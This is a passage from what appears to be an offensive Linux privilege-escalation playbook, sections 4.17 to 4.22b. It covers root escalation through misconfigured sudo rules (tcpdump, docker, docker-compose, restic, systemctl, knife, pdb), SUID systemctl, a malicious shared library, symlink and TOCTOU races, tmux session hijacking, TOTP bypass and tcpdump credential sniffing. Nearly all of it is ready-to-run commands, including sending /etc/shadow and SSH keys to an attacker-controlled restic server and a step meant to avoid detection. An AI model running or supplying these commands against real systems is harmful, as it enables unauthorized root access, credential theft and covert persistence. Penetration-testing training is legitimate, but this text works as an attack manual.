cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
EOF
chmod +x /tmp/pwn.sh
sudo tcpdump -i lo -w /tmp/cap.pcap -G 1 -W 1 -z /tmp/pwn.sh
# -G 1 = rotate every 1 second, -W 1 = only 1 file, then -z fires

# Method 2: Simpler with -c (capture count limit)
sudo tcpdump -i lo -c 1 -w /tmp/cap.pcap -z /tmp/pwn.sh &
ping -c 1 127.0.0.1  # generate one packet to satisfy -c 1

# Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# tcpdump is the tool; /tmp/pwn.sh is just a bash script — fully LOTL
# Alternative without writing a script file (bash -c inline won't work with -z; must be a path)
# Workaround: echo payload into a file first — that's already LOTL
printf '#!/bin/sh\nid > /tmp/proof' > /tmp/z.sh && chmod +x /tmp/z.sh
sudo tcpdump -i lo -c 1 -w /tmp/x -G 1 -W 1 -z /tmp/z.sh &
ping -c 1 127.0.0.1
```

### 4.17g Sudo docker exec Wildcard — Privileged Flag Injection

When `sudo -l` shows `(root) NOPASSWD: /usr/bin/docker exec *` (wildcard), inject `--privileged -u root` flags before the container name, overriding the container's default user/capability set.

```bash
# Detect
sudo -l | grep "docker exec"
# Look for: (root) NOPASSWD: /usr/bin/docker exec *

# List running containers
docker ps

# Exploit: inject --privileged and -u root before container ID
sudo /usr/bin/docker exec --privileged -u root -it <CONTAINER_ID> /bin/bash

# Inside the now-privileged container: mount host filesystem
fdisk -l 2>/dev/null || ls /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs bash
# Now on the host as root
```

#### Living-off-the-land / LOTL variant

```bash
# docker is the tool itself — no downloads needed
# The wildcard in sudoers permits arbitrary flag injection
sudo /usr/bin/docker exec --privileged -u root -it <CONTAINER_ID> sh -c 'cat /etc/shadow'
```

### 4.17h Sudo docker-compose — Root via Attacker-Controlled YAML

When `sudo -l` shows NOPASSWD on `/usr/bin/docker-compose` or `/usr/local/bin/docker-compose`, supply a YAML file that mounts the host filesystem and gains root.

```bash
# Detect
sudo -l | grep docker-compose

# Method 1: Volume mount + chroot (classic)
cat > /tmp/pwn.yml <<'EOF'
version: "3"
services:
  pwn:
    image: alpine
    volumes:
      - /:/mnt
    command: chroot /mnt bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
EOF
sudo docker-compose -f /tmp/pwn.yml up

# Method 2: cap_add ALL (bypasses wrapper scripts that block volume mounts)
cat > /tmp/pwn.yml <<'EOF'
version: "3"
services:
  pwn:
    image: alpine
    cap_add:
      - ALL
    privileged: true
    pid: host
    command: nsenter -t 1 -m -u -i -n -p -- bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
EOF
sudo docker-compose -f /tmp/pwn.yml up

# Collect (on host)
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# docker-compose is the tool; only cat/echo needed for YAML
# Requires a pulled image (alpine is ~5MB, often already cached)
# If no image is available, use whatever `docker images` shows:
docker images --format '{{.Repository}}:{{.Tag}}' | head -1
```

### 4.17i Sudo restic backup — Arbitrary File Read via Attacker-Controlled Repo

When `sudo -l` shows NOPASSWD on `/usr/bin/restic`, the backup subcommand sends file contents to the configured repository. Point it at a local writable repo to exfiltrate any file on the system.

```bash
# Detect
sudo -l | grep restic

# Method 1: Local repo (no network needed)
sudo restic -r /tmp/myrepo init --password-command 'echo x'
sudo restic -r /tmp/myrepo backup /etc/shadow /root/.ssh --password-command 'echo x'
restic -r /tmp/myrepo dump latest /etc/shadow --password-command 'echo x'

# Method 2: Remote rest-server on attacker box
# On attacker: restic-rest-server --no-auth --path /tmp/restic-repo &
sudo restic -r rest:http://<ATTACKER_IP>:8000/ init --password-command 'echo pwn'
sudo restic -r rest:http://<ATTACKER_IP>:8000/ backup /etc/shadow /root/.ssh --password-command 'echo pwn'

# On attacker, restore and read
restic -r /tmp/restic-repo restore latest --target /tmp/loot --password-command 'echo pwn'
cat /tmp/loot/etc/shadow
```

#### Living-off-the-land / LOTL variant

```bash
# restic is the tool permitted by sudo — no additional installs on target
# Local repo approach requires only a writable dir (/tmp):
sudo restic -r /tmp/r init --password-command 'echo x'
sudo restic -r /tmp/r backup /root/.ssh --password-command 'echo x'
restic -r /tmp/r dump latest /root/.ssh/id_rsa --password-command 'echo x'
```

### 4.17j Sudo systemctl with Wildcard — Writable Unit Directory Privesc

When `sudo -l` shows `(root) NOPASSWD: /bin/systemctl restart *` (or start/stop/reload with wildcard), and a systemd unit directory is writable, plant a new `.service` file and restart it for root code execution.

```bash
# Detect
sudo -l | grep systemctl
# Look for: (root) NOPASSWD: /bin/systemctl restart *
#           (root) NOPASSWD: /bin/systemctl start *

# Check which unit directories are writable
ls -ld /etc/systemd/system/ /run/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null
getfacl /etc/systemd/system/ 2>/dev/null
find /etc/systemd/system/ /run/systemd/system/ -writable -type d 2>/dev/null

# Step 1: Create a malicious service unit
cat > /etc/systemd/system/pwn.service <<'EOF'
[Unit]
Description=pwn

[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"

[Install]
WantedBy=multi-user.target
EOF

# Step 2: Reload and start (if sudo allows daemon-reload + start/restart)
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart pwn.service

# If daemon-reload is not permitted, use /run/systemd/system/ (takes effect without reload)
cat > /run/systemd/system/pwn.service <<'EOF'
[Unit]
Description=pwn
[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
EOF
sudo /bin/systemctl restart pwn.service

# Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# systemctl and bash are native — no external tools
# The unit file is plain text written with cat/echo
# /run/systemd/system/ does not require daemon-reload on most systemd versions
```

### 4.17k Sudo adduser — Group Name Collision Privilege Escalation

When `sudo -l` shows NOPASSWD on `/usr/sbin/adduser`, creating a user with the same name as an existing privileged group (admin/sudo/wheel) causes `adduser` to assign that group as the new user's primary group instead of creating a new one.

```bash
# Detect
sudo -l | grep adduser

# Check existing privileged groups
grep -E '^(admin|sudo|wheel):' /etc/group

# Exploit: create user named after the sudo/admin group
# If 'admin' group exists and grants sudo-like access:
sudo adduser admin
# adduser sees group 'admin' already exists → assigns it as primary group
# New user 'admin' inherits all permissions of the 'admin' group

# Set password when prompted, then switch to the new user
su - admin
sudo -i   # if admin group has sudoers entry

# Alternative: target 'sudo' group directly (if it exists)
sudo adduser sudo
su - sudo
sudo -i
```

#### Living-off-the-land / LOTL variant

```bash
# adduser is the native user-creation tool — fully LOTL
# The exploit relies on adduser's default behavior of reusing existing group names
# Verify the group grants privilege before creating the user:
grep admin /etc/sudoers /etc/sudoers.d/* 2>/dev/null
```

### 4.17l Sudo Chef knife — Ruby Execution Primitives

When `sudo -l` shows NOPASSWD on `/usr/bin/knife`, knife's `exec` subcommand evaluates arbitrary Ruby code, and the `-e` (editor) flag on various subcommands can invoke a shell.

```bash
# Detect
sudo -l | grep knife

# Method 1: knife exec — direct Ruby eval as root
sudo knife exec -E 'exec "/bin/bash"'

# Method 2: knife exec with system() for payload
sudo knife exec -E 'system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")'

# Method 3: knife node/data bag create with editor escape
export EDITOR='/bin/bash'
sudo knife data bag create pwn item

# Method 4: knife -c (config file) — Ruby is valid config
cat > /tmp/knife.rb <<'EOF'
system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF
sudo knife -c /tmp/knife.rb node list

# Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# knife is the tool itself; exec -E is the simplest path — no files needed
sudo knife exec -E 'exec "/bin/sh"'
```

### 4.17m Sudo Desktop/CAD Application — Post-Processing Script Abuse

When `sudo -l` shows NOPASSWD on desktop applications that support project-file-embedded scripts (PrusaSlicer, LibreOffice, Inkscape), the project file format itself contains executable code that runs as root when the application processes it.

```bash
# Detect
sudo -l | grep -iE "prusa|slic3r|libreoffice|soffice|inkscape"

# === PrusaSlicer / SuperSlicer ===
# .3mf project files embed post-processing scripts in the config
mkdir -p /tmp/pwn3mf/Metadata
cat > /tmp/pwn3mf/Metadata/Slic3r_PE.config <<'EOF'
; post_process = /tmp/pwn.sh
post_process = cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash;
EOF
cd /tmp/pwn3mf && zip -r /tmp/evil.3mf .
sudo prusa-slicer --export-gcode /tmp/evil.3mf

# === LibreOffice ===
# Macros run via --headless when sudo'd
cat > /tmp/macro.py <<'EOF'
import os
def pwn(*args):
    os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
    return None
EOF
sudo libreoffice --headless --invisible "macro:///Standard.Module1.pwn" /tmp/doc.odt

# === Inkscape ===
# Extensions execute Python scripts; --verb triggers processing
cat > /tmp/evil.svg <<'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg"></svg>
EOF
sudo inkscape /tmp/evil.svg --export-filename=/tmp/out.png --actions="org.inkscape.effect.exec;/tmp/pwn.sh"

# Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# The application itself is the execution engine — only file creation (cat/echo) needed
# PrusaSlicer: post_process directive in .3mf config = shell command
# LibreOffice: --headless macro invocation requires no GUI
# Inkscape: extension system processes from extension dirs
```

### 4.17n Sudo Python Script — pdb.post_mortem Shell Escape

When `sudo -l` shows NOPASSWD on a specific Python script, trigger an unhandled exception to land in Python's debugger (pdb), then escape to an interactive shell as root.

```bash
# Detect
sudo -l | grep "python"
# Look for: (root) NOPASSWD: /usr/bin/python3 /opt/app/script.py

# Method 1: Force an exception + PYTHONSTARTUP to inject pdb auto-start
cat > /tmp/pdb_hook.py <<'EOF'
import pdb, sys
def excepthook(t, v, tb):
    pdb.post_mortem(tb)
sys.excepthook = excepthook
EOF
sudo PYTHONSTARTUP=/tmp/pdb_hook.py /usr/bin/python3 /opt/app/script.py <INVALID_INPUT>

# Method 2: python -m pdb (if sudoers allows python3 + script path)
sudo /usr/bin/python3 -m pdb /opt/app/script.py
# At (Pdb) prompt:
# (Pdb) import os; os.system("/bin/bash")

# Method 3: PYTHONBREAKPOINT env var (if env_keep includes it)
sudo PYTHONBREAKPOINT=os.system /usr/bin/python3 /opt/app/script.py
# When script hits breakpoint() → os.system() is called

# At any (Pdb) prompt — root shell escape:
# (Pdb) import os; os.setuid(0); os.system("/bin/bash")
```

#### Living-off-the-land / LOTL variant

```bash
# Python ships with pdb in stdlib — no pip install needed
# Simplest escape once at (Pdb) prompt:
# import os; os.system("/bin/sh")
# Or: os.execv("/bin/sh", ["/bin/sh"])
```

### 4.18 SUID systemctl — Link Unit File Privesc (GTFOBins)

When `systemctl` is SUID-root, `systemctl link` allows symlinking a user-controlled `.service` file into the systemd unit tree, then starting it executes arbitrary commands as root.

```bash
# Detect
find / -name "systemctl" -perm -4000 2>/dev/null
ls -la /bin/systemctl /usr/bin/systemctl

# Step 1: Create a malicious service file in a user-writable location
cat > /tmp/pwn.service <<'EOF'
[Unit]
Description=pwn

[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"

[Install]
WantedBy=multi-user.target
EOF

# Step 2: Link the unit file into systemd's search path
/bin/systemctl link /tmp/pwn.service

# Step 3: Start the service (SUID systemctl runs this as root)
/bin/systemctl start pwn.service

# Step 4: Enable + start if 'start' alone doesn't work
/bin/systemctl enable --now /tmp/pwn.service

# Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# systemctl is the SUID binary itself — fully native
# Only need cat/echo to create the .service file
# Alternative: use systemctl's pager escape if output is long enough:
SYSTEMD_PAGER='/bin/bash' /bin/systemctl status
```

### 4.18b SUID Binary Symlink-to-Predictable-Filename — Arbitrary File Read

When a SUID binary reads from or writes to a predictable filename (time-based, PID-based, or relative-path), replace the target path with a symlink to redirect the I/O to a sensitive file.

```bash
# Step 1: Identify the predictable filename via strace/ltrace
strace -f -e openat,access,stat <SUID_BINARY> 2>&1 | grep -E "/tmp|/var/tmp|\.log|\.pid"
ltrace <SUID_BINARY> 2>&1 | grep -E "fopen|open|access"

# Pattern A: Time-based filename (e.g., /tmp/app_YYYYMMDD.log)
ln -sf /etc/shadow /tmp/app_$(date +%Y%m%d).log
<SUID_BINARY>   # reads/writes through your symlink

# Pattern B: Relative-path filename (e.g., ./output.txt in CWD)
mkdir /tmp/exploit && cd /tmp/exploit
ln -sf /etc/shadow ./output.txt
<SUID_BINARY>   # opens ./output.txt → follows symlink → reads /etc/shadow as root
cat output.txt 2>/dev/null

# Pattern C: PID-based filename (e.g., /tmp/app_$PID.tmp)
# Spray symlinks covering likely PID range
while true; do
  for pid in $(seq 30000 30100); do
    ln -sf /etc/shadow /tmp/app_${pid}.tmp 2>/dev/null
  done
done &
<SUID_BINARY>
kill %1
```

#### Living-off-the-land / LOTL variant

```bash
# ln -sf is the only tool needed — ships with coreutils
# strace/ltrace for discovery; if unavailable, use strings to find path patterns:
strings <SUID_BINARY> | grep -E "/tmp/|/var/tmp/|\./|%d|%s"
```

### 4.18c SUID Library Hijack via Writable /etc/ld.so.conf.d Search-Path Entry

When a directory listed in `/etc/ld.so.conf.d/*.conf` is writable, place a same-named shared library to shadow the real one. Any SUID binary that loads that library via the linker search path will execute your code as root.

```bash
# Step 1: Enumerate linker search paths and check writability
cat /etc/ld.so.conf
cat /etc/ld.so.conf.d/*.conf
for dir in $(cat /etc/ld.so.conf.d/*.conf 2>/dev/null | grep -v "^#"); do
  [ -w "$dir" ] && echo "[!] WRITABLE: $dir"
done

# Step 2: Identify which libraries SUID binaries load from that path
find / -perm -4000 -type f 2>/dev/null | while read bin; do
  ldd "$bin" 2>/dev/null | grep "$WRITABLE_DIR"
done

# Step 3: Build malicious shared library with matching SONAME
cat > /tmp/evil.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void pwn(void) {
    if (getuid() != 0) return;
    setuid(0); setgid(0);
    system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash");
}
EOF
gcc -shared -fPIC -Wl,-soname,<LIBNAME>.so.<VERSION> -o <WRITABLE_DIR>/<LIBNAME>.so.<VERSION> /tmp/evil.c

# Step 4: Refresh the linker cache
ldconfig  # if you can run it; otherwise wait for root cron or reboot

# Step 5: Trigger the SUID binary
<SUID_BINARY>
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# gcc is needed for compilation — no pure LOTL alternative for .so creation
# If gcc is unavailable on target, compile on attacker and transfer the .so
# Discovery is fully LOTL:
cat /etc/ld.so.conf.d/*.conf | while read d; do test -w "$d" && echo "WRITABLE: $d"; done
```

### 4.18d SUID TOCTOU Race — access()/stat() Check Then open() Symlink Swap

When a SUID binary checks file permissions with `access()` or `stat()`, then opens the file in a separate call, there is a race window to swap the file for a symlink to a privileged target.

```bash
# Step 1: Identify the TOCTOU pattern via strace
strace -f -e access,stat,lstat,openat <SUID_BINARY> /tmp/testfile 2>&1
# Vulnerable: access("/tmp/testfile", R_OK) = 0 → openat("/tmp/testfile", ...)
# The gap between access() and openat() is the race window

# Step 2: Set up the race — loop swapping between legit file and symlink
echo "legit" > /tmp/legit && chmod 644 /tmp/legit
while true; do
  ln -sf /etc/shadow /tmp/testfile
  ln -sf /tmp/legit  /tmp/testfile
done &

# Step 3: Continuously invoke the SUID binary
while true; do
  <SUID_BINARY> /tmp/testfile 2>/tmp/output
  grep -q "root:" /tmp/output && break
done
kill %1

# Step 4: Using inotifywait for more reliable wins
cat > /tmp/race.sh <<'EOF'
#!/bin/bash
while true; do
  echo "legit" > /tmp/testfile
  inotifywait -qq -e access /tmp/testfile 2>/dev/null
  ln -sf /etc/shadow /tmp/testfile
done
EOF
chmod +x /tmp/race.sh
/tmp/race.sh &
<SUID_BINARY> /tmp/testfile
kill %1
```

#### Living-off-the-land / LOTL variant

```bash
# ln -sf loop is fully LOTL (coreutils)
# inotifywait requires inotify-tools (often installed)
# Without inotifywait, tight bash loop is the fallback:
while true; do ln -sf /etc/shadow /tmp/f; ln -sf /tmp/ok /tmp/f; done &
```

### 4.19 Tmux / GNU Screen Shared-Session Hijack

When a root (or higher-privilege) user has a detached tmux/screen session with permissive socket/directory permissions, attaching to it gives you their shell.

```bash
# === TMUX ===

# Detect tmux sockets accessible to current user
find /tmp/tmux-* -type s 2>/dev/null
ls -la /tmp/tmux-*/

# Check running tmux sessions owned by other users
ps aux | grep tmux | grep -v grep

# If socket is world-readable/writable or group-accessible:
ls -la /tmp/tmux-0/default    # tmux-<UID>/default is the socket path

# Attach to root's session
tmux -S /tmp/tmux-0/default attach

# If tmux says "sessions should be nested" — unset TMUX first:
unset TMUX && tmux -S /tmp/tmux-0/default attach

# === GNU SCREEN ===

# Detect screen sessions
screen -ls              # shows your sessions
ls -la /var/run/screen/ # directory per user
ls -la /run/screen/

# Find other users' screen sessions
find /var/run/screen /run/screen -type d 2>/dev/null
ls -la /var/run/screen/S-root/ 2>/dev/null

# Check for multiuser mode (allows attachment by other users)
screen -x root/<SESSION_NAME>

# If screen is SUID and you're in the session's group:
screen -r root/<SESSION_NAME>
```

#### Living-off-the-land / LOTL variant

```bash
# tmux and screen are standard terminal multiplexers — no downloads
# Detection is just ls + find; exploitation is just attaching
# Key check: socket permissions must allow your user to connect
stat /tmp/tmux-0/default 2>/dev/null
```

### 4.19b TOTP/Google Authenticator Secret-to-OTP — Bypass SSH 2FA

When Google Authenticator (PAM) secrets are readable (leaked config, backup file, readable `~/.google_authenticator`), generate valid TOTP codes to bypass SSH two-factor authentication. See also section 5.1he for the full credential-extraction workflow.

```bash
# Step 1: Find leaked TOTP secrets
find / -name ".google_authenticator" -readable 2>/dev/null
cat /home/<USER>/.google_authenticator
# First line = base32 secret; last 5 lines = emergency scratch codes

# Also check backups and provisioning scripts
grep -r "google_authenticator\|totp\|oathtool" /var/backups /opt /etc 2>/dev/null

# Step 2: Generate a valid OTP from the secret
oathtool --totp --base32 <SECRET>

# Step 3: Use the code for SSH login
ssh <USER>@<TARGET>
# Enter password → then enter the generated 6-digit OTP

# Step 4: If oathtool unavailable, use Python stdlib
python3 -c "
import hmac, struct, time, base64, hashlib
secret = base64.b32decode('<SECRET>')
counter = int(time.time()) // 30
h = hmac.new(secret, struct.pack('>Q', counter), hashlib.sha1).digest()
o = h[-1] & 0xf
code = (struct.unpack('>I', h[o:o+4])[0] & 0x7fffffff) % 1000000
print(f'{code:06d}')
"
```

#### Living-off-the-land / LOTL variant

```bash
# Python3 stdlib generates valid TOTP — no pip install needed
# oathtool (oath-toolkit) is the binary alternative
# Emergency scratch codes require no computation — use directly
oathtool --totp --base32 '<SECRET>'
```

### 4.19c tcpdump Credential Harvesting — Post-Compromise Packet Sniffing

After compromising a host (with `cap_net_raw` capability or root), sniff loopback/network traffic to harvest cleartext credentials from local services.

```bash
# Check if tcpdump is available and if you have cap_net_raw
which tcpdump
getcap $(which tcpdump) 2>/dev/null

# Sniff HTTP Basic Auth on all interfaces
tcpdump -i any -A -s 0 'tcp port 80 or tcp port 8080' 2>/dev/null | grep -iE "Authorization:|password=|passwd=|pass="

# Sniff FTP credentials (port 21)
tcpdump -i any -A -s 0 'tcp port 21' 2>/dev/null | grep -iE "USER |PASS "

# Sniff SMTP/POP3/IMAP credentials
tcpdump -i any -A -s 0 'tcp port 25 or tcp port 110 or tcp port 143' 2>/dev/null | grep -iE "USER |PASS |AUTH"

# Sniff loopback traffic (internal services talking to DB/API)
tcpdump -i lo -A -s 0 'tcp' 2>/dev/null | grep -iE "password|passwd|secret|token|auth"

# Capture to file for offline analysis (quieter)
tcpdump -i any -w /tmp/cap.pcap -c 10000 'not port 22' &
# Later: strings /tmp/cap.pcap | grep -iE 'password|pass=|Authorization'

# MySQL protocol sniffing (port 3306)
tcpdump -i lo -A -s 0 'tcp port 3306' 2>/dev/null | strings | grep -iE "root|admin|password"

# Redis AUTH (port 6379 — plaintext)
tcpdump -i lo -A -s 0 'tcp port 6379' 2>/dev/null | grep -i "AUTH "
```

#### Living-off-the-land / LOTL variant

```bash
# tcpdump ships with most Linux installs — fully LOTL
# If tcpdump is unavailable: check for existing pcap files on the host
find / -name "*.pcap" -o -name "*.cap" 2>/dev/null | xargs strings 2>/dev/null | grep -i pass
# /proc/net/tcp shows connections but not payload
```

### 4.20 Symlink in World-Writable Directory — Redirect Privileged Process Writes

When a root-owned process writes to a predictable path inside a world-writable directory (`/tmp`, `/var/tmp`, `/dev/shm`), replace the target with a symlink to redirect the write to an arbitrary location.

```bash
# Step 1: Identify privileged processes writing to world-writable dirs
inotifywait -m -r /tmp/ -e create,modify 2>&1 | grep -v "\.swp"
# Or: find /tmp /var/tmp /dev/shm -user root -newer /tmp/.marker 2>/dev/null

# Step 2: Identify the predictable filename pattern
ls -la /tmp/ | grep root   # files owned by root in /tmp

# Step 3: Remove the file and replace with symlink
rm -f /tmp/<PREDICTABLE_FILE>
ln -sf /root/.ssh/authorized_keys /tmp/<PREDICTABLE_FILE>
# Root process writes → content lands in authorized_keys

# Step 4: For cron.d injection (content must be valid cron):
rm -f /tmp/<PREDICTABLE_FILE>
ln -sf /etc/cron.d/pwn /tmp/<PREDICTABLE_FILE>

# Step 5: For processes that create files (not overwrite existing)
while true; do
  rm -f /tmp/<PREDICTABLE_FILE>
  ln -sf /etc/sudoers.d/pwn /tmp/<PREDICTABLE_FILE>
  sleep 0.01
done &
# Wait for root process → verify:
cat /etc/sudoers.d/pwn
```

#### Living-off-the-land / LOTL variant

```bash
# ln -sf and rm are coreutils — fully LOTL
# inotifywait (inotify-tools) improves reliability but tight loop works without it
# Discovery: find /tmp -user root 2>/dev/null
```

### 4.20b Symlink Abuse Against Privileged Script Reading Fixed Log Path

When a privileged script (root cron, systemd service) reads from a hardcoded file path, and the parent directory is writable by the attacker, replace the file with a symlink to read or influence arbitrary files.

```bash
# Step 1: Identify the pattern
grep -rE "cat |head |tail |less |wc |grep " /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
find /opt /usr/local -name "*.sh" -exec grep -lE "cat /|< /" {} \; 2>/dev/null

# Step 2: Confirm the parent directory is writable
ls -ld $(dirname <FIXED_LOG_PATH>)

# Step 3: Replace with symlink to target file
rm -f <FIXED_LOG_PATH>
ln -sf /etc/shadow <FIXED_LOG_PATH>

# Step 4: The privileged script reads through the symlink
# If the script outputs/processes the content (email, dashboard, another log):
cat <OUTPUT_LOCATION>   # contains /etc/shadow content

# Step 5: For write redirects (script writes to the log path)
rm -f <FIXED_LOG_PATH>
ln -sf /root/.ssh/authorized_keys <FIXED_LOG_PATH>
# Script appends → controlled content lands in root's authorized_keys
```

#### Living-off-the-land / LOTL variant

```bash
# rm + ln -sf are coreutils — fully LOTL
# Key requirement: writable parent directory of the hardcoded path
test -w $(dirname <FIXED_LOG_PATH>) && echo "exploitable"
```

### 4.20c Symlink Swap on tar Source Directory — Root chmod -R Exploitation

When a root cron job creates a tar archive from a user-owned directory and then applies `chmod -R` on extracted content, replace the source directory with a symlink to `/root` between the tar creation and the chmod operation.

```bash
# Step 1: Identify the pattern in root cron/scripts
grep -rE "(tar|chmod|chown).*-[Rr]" /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
cat /etc/crontab | grep -E "tar|backup|chmod"

# Step 2: Understand the timing
# Typical: tar cf archive user-dir → tar xf → chmod -R 777 extracted/

# Step 3: Replace source directory with symlink to privileged path
mv /home/<USER>/data /home/<USER>/data.bak
ln -sf /root /home/<USER>/data

# tar follows symlinks → archive contains /root/* contents
# chmod -R 777 on extracted content → /root files become world-readable

# Step 4: Collect
cat /root/.ssh/id_rsa 2>/dev/null || cat /tmp/verify/root/.ssh/id_rsa

# Step 5: Restore original to avoid detection
rm /home/<USER>/data
mv /home/<USER>/data.bak /home/<USER>/data
```

#### Living-off-the-land / LOTL variant

```bash
# mv + ln -sf are coreutils — fully LOTL
# tar follows symlinks by default; no special flags needed by attacker
```

### 4.21 TOCTOU Race — Sudo Script with Predictable Temp File

When a root-run (sudo) bash script creates a temporary file with a predictable name (e.g., `/tmp/script_$$`, `/tmp/app.tmp`), race to replace it with a symlink between creation and use, redirecting reads/writes to arbitrary files.

```bash
# Step 1: Identify the predictable temp file
cat <SCRIPT_PATH> | grep -E '/tmp/|/var/tmp/|mktemp'
# Vulnerable: /tmp/fixed_name or /tmp/${something_predictable}
# Safe: mktemp (random suffix) — much harder to race

# Step 2: Hot-loop symlink replacement
while true; do
  rm -f /tmp/app.tmp
  ln -sf /etc/sudoers.d/pwn /tmp/app.tmp
done &
RACE_PID=$!

# Step 3: Trigger the sudo script repeatedly
for i in $(seq 1 100); do
  sudo /opt/app/vulnerable_script.sh 2>/dev/null
done
kill $RACE_PID

# Step 4: Check if the race succeeded
cat /etc/sudoers.d/pwn 2>/dev/null

# Step 5: inotifywait-based precision race
cat > /tmp/race.sh <<'EOF'
#!/bin/bash
while true; do
  inotifywait -qq -e create /tmp/ 2>/dev/null
  rm -f /tmp/app.tmp
  ln -sf /etc/sudoers.d/pwn /tmp/app.tmp
done
EOF
chmod +x /tmp/race.sh
/tmp/race.sh &
sudo /opt/app/vulnerable_script.sh
```

#### Living-off-the-land / LOTL variant

```bash
# rm + ln -sf + bash loop = fully LOTL
# inotifywait improves win rate but is optional
while true; do ln -sf /etc/sudoers.d/pwn /tmp/app.tmp 2>/dev/null; done &
```

### 4.21b TOCTOU Race — Root Extract-and-Diff Workflow (Archive Replacement)

When a root cron/script creates a tar archive, sleeps or processes, then extracts it, replace the archive mid-sleep to plant a SUID binary in the extraction output.

```bash
# Step 1: Identify the pattern
grep -rE "tar.*cf|sleep|tar.*xf" /etc/cron* /opt/ /usr/local/bin/ 2>/dev/null
# Vulnerable: tar cf /tmp/backup.tar → sleep → tar xf /tmp/backup.tar -C /tmp/verify/

# Step 2: Create malicious archive with SUID binary
cp /bin/bash /tmp/rootbash_src
chmod u+s /tmp/rootbash_src
tar cf /tmp/evil.tar --transform='s|rootbash_src|rootbash|' /tmp/rootbash_src

# Step 3: Race — replace archive between create and extract
cat > /tmp/race_tar.sh <<'EOF'
#!/bin/bash
while true; do
  inotifywait -qq -e close_write /tmp/backup.tar 2>/dev/null
  cp /tmp/evil.tar /tmp/backup.tar
done
EOF
chmod +x /tmp/race_tar.sh
/tmp/race_tar.sh &

# Wait for cron → tar creates backup.tar → script replaces it → tar extracts evil

# Step 4: Check extraction directory for SUID binary
ls -la /tmp/verify/rootbash
/tmp/verify/rootbash -p
# Note: root tar extract preserves SUID bit (--same-permissions is default for root)
```

#### Living-off-the-land / LOTL variant

```bash
# tar + cp + bash loop = fully LOTL
# Without inotifywait, monitor file mtime in loop:
while true; do
  [ /tmp/backup.tar -nt /tmp/.marker ] && cp /tmp/evil.tar /tmp/backup.tar && touch /tmp/.marker
  sleep 0.1
done &
```

### 4.21c TOCTOU Symlink Race Against Sudo Script — Check-Move-Read Pattern

When a sudo-permitted script validates a file, moves it, then reads it as root (quarantine/approval pattern), swap the symlink target between the validation and read phases.

```bash
# Step 1: Understand the vulnerable script flow
# Typical: test -f /upload/file → mv to /approved/ → cat /approved/file (as root)
# Attack: make /upload/file a symlink; swap target between check and read

# Step 2: Set up the race
echo "safe content" > /tmp/safe.txt
ln -sf /tmp/safe.txt /upload/file.txt

# Step 3: Hot-loop to swap symlink target after validation
cat > /tmp/race_symlink.sh <<'EOF'
#!/bin/bash
while true; do
  inotifywait -qq -e access /tmp/safe.txt 2>/dev/null
  ln -sf /etc/shadow /upload/file.txt
done
EOF
chmod +x /tmp/race_symlink.sh
/tmp/race_symlink.sh &

# Step 4: Trigger the sudo script
sudo /opt/app/process_upload.sh
# Script validates → sees safe content → reads... but symlink now points to /etc/shadow

# Step 5: Check output location for leaked content
cat /var/log/app/processed.log | grep root:
kill %1
```

#### Living-off-the-land / LOTL variant

```bash
# ln -sf + inotifywait (or tight loop) = mostly LOTL
# Without inotifywait:
while true; do ln -sf /etc/shadow /upload/file.txt; ln -sf /tmp/safe.txt /upload/file.txt; done &
```

### 4.22 supervisord Config Hijack — Root Code Execution via [program:*]

When supervisord is running as root and its config includes a writable `include` glob (e.g., `/etc/supervisor/conf.d/*.conf` with world-writable directory), writing a new `[program:*]` section yields root code execution.

```bash
# Step 1: Detect supervisord running as root
ps aux | grep supervisord | grep -v grep

# Step 2: Check config include path for writability
cat /etc/supervisor/supervisord.conf | grep -A2 "\[include\]"
# Look for: files = /etc/supervisor/conf.d/*.conf
ls -ld /etc/supervisor/conf.d/ /etc/supervisord.d/ 2>/dev/null

# Step 3: Write malicious program config
cat > /etc/supervisor/conf.d/pwn.conf <<'EOF'
[program:pwn]
command=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"
autostart=true
autorestart=false
user=root
EOF

# Step 4: Reload supervisord to pick up new config
supervisorctl reread && supervisorctl update
# Or if supervisorctl requires auth:
kill -HUP $(pgrep supervisord)   # SIGHUP triggers config reload

# Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# cat/echo for config creation + supervisorctl (ships with supervisor) = LOTL
# If supervisorctl is restricted, SIGHUP to supervisord PID triggers reload
# No downloads needed — exploit is purely config manipulation
```

### 4.22b TIOCSTI PTY Input Injection — Shared Terminal Privilege Escalation

When two users share a PTY (e.g., `su` without `-l`, `sudo -s` from another user's terminal), the TIOCSTI ioctl pushes characters into the terminal's input queue — executing commands as the other user when you exit.

```bash
